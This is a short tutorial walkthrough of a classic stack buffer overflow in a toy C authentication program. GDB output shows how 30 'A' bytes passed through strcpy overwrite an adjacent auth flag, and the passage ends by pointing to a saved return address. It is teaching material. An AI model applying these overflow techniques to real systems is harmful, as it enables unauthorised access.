'authentication.c' is so simple and looks like granting access only the case of
entering "brillig" or "outgrabe" as an argument.  
But by entering 30 times of 'A', we can exploit this program.  
Let's take a look why this happens.  
```
/*
 * compiled with -fno-stack-protector option
 * set breakpoint at strcpy(password_buffer, password);
 * (gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 */
 
(gdb) print &auth_flag  
$1 = (int *) 0x7fffffffdf3c  
(gdb) print &password_buffer  
$2 = (char (*)[16]) 0x7fffffffdf20  
```
By debugging the program, we can find the address of auth_flag is 28 bytes after than password_buffer.    
Since strcpy() does not check boundary, if we give more than 28 bytes(not too much)length of any string as argument, auth_flag will be set to nonzero.
```
/*
 * set breakpoint at return auth_flag;
 * (gdb) c  //abbreviation of continue
 */
(gdb) x/16xw password_buffer
0x7fffffffdf20 : 0x41414141 0x41414141  0x41414141  0x41414141
0x7fffffffdf30 : 0x41414141 0x41414141  0x41414141  0x00004141
0x7fffffffdf40 : 0xffffdf60 0x00007fff  0x5555481e  0x00005555
0x7fffffffdf50 : 0xffffe048 0x00007fff  0x00000000  0x00000002
(gdb) x/u &auth_flag
0x7fffffffdf3c: 16705 // 0x4141 in hex
```
Variable auth_flag is located at 0x7ffffffffdf3c~f(in bold) and it is overwritten to 16705.   
Since this machine is little endian, rightmost 41 is 0x7fffffffdf3c.    
So access will be granted, because any nonzero number is considered as true. This is basic concept of stack overflow.  
  
Here, we have to focus the value of 0x7fffffffdf48~f(in italic).  
```
(gdb) disass main
...
0x0000555555554819 <+72>:  call 0x55555555476a <check_authentication>
0x000055555555481e <+77>:  test eax,eax
...
```
_0x000055555555481e_ is return adress when function check_authentication is end.   
  
